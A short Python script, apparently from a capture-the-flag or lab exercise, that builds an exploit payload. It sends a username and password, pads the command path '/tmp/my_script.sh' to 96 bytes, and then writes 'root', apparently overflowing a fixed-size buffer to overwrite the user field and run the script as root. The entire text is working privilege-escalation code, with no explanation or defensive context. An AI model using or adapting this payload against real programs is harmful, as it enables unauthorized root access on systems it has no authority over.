command = b'/tmp/my_script.sh'

payload = b'nobody\n'
payload += b'Ksdkjkk32avsh\n'
payload += command + b'\x00' + b'c' * (96 - len(command) - 1)
payload += b'root\x00'

print(payload)
